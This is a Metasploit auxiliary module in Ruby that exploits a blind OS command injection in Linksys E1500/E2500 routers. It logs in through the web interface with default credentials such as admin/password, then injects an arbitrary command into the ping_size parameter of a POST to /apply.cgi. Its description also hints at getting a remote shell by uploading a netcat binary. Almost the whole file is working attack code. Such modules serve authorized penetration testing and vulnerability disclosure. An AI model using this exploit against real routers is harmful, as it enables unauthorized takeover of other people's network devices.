##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'            => 'Linksys E1500/E2500 Remote OS Command Execution',
			'Description'     => %q{
					Some Linksys Routers are vulnerable to OS Command injection.
				You will need credentials to the webinterface to access the vulnerable part
				of the application. Default credentials are always a good starting point.
				admin/admin or admin/password could be a first try.
				Note: This is a blind os command injection vulnerability. This means that you will
				not see any output of your command. Try a ping command to your local system for a
				first test.

				Hint: To get a remote shell you could upload a cross-compiled netcat binary and exec it.
			},
			'Author'          => [ 'm-1-k-3' ],
			'License'         => MSF_LICENSE,
			'References'      =>
				[
					[ 'URL', 'http://homesupport.cisco.com/de-eu/support/routers/E1500' ],
					[ 'URL', 'http://www.s3cur1ty.de/m1adv2013-004' ],
					[ 'EDB', '24475' ],
					[ 'OSVDB', '89912' ],
					[ 'BID', '57760' ]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Feb 05 2013'))

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('USERNAME',[ true, 'User to login with', 'admin']),
				OptString.new('PASSWORD',[ true, 'Password to login with', 'password']),
				OptString.new('CMD', [ true, 'The command to execute', 'ping 127.0.0.1'])
			], self.class)
	end

	def run
		uri = '/apply.cgi'
		user = datastore['USERNAME']
		pass = datastore['PASSWORD']

		print_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")

		begin
				res = send_request_cgi({
						'uri'     => uri,
						'method'  => 'GET',
						'authorization' => basic_auth(user,pass)
						})

				return :abort if res.nil?
				return :abort if (res.code == 404)

			if [200, 301, 302].include?(res.code)
				print_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
			else
				vprint_error("#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
				return
			end

		rescue ::Rex::ConnectionError
				vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
				return
		end


		print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])

		cmd = datastore['CMD']
		#original post request:
		data_cmd = "submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&action=&commit=0&ping_ip=1.1.1.1&ping_size=%26#{cmd}%26&ping_times=5&traceroute_ip="

		vprint_status("#{rhost}:#{rport} - using the following target URL: \n#{uri}")
		begin
			res = send_request_cgi(
				{
					'uri'    => uri,
					'method' => 'POST',
					'authorization' => basic_auth(user,pass),
					'data'  => data_cmd
					#vars_post not working?
					#'vars_post' => {
					#	"submit_button" => "Diagnostics",
					#	"change_action" => "gozila_cgi",
					#	"submit_type" => "start_ping",
					#	"action" => "",
					#	"commit" => "0",
					#	"ping_ip" => "1.1.1.1",
					#	"ping_size" => "%26#{cmd}%26",
					#	"ping_times" => "5",
					#	"traceroute_ip" => ""
					#	}
				})
		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
			return :abort
		end
		print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state")
	end
end
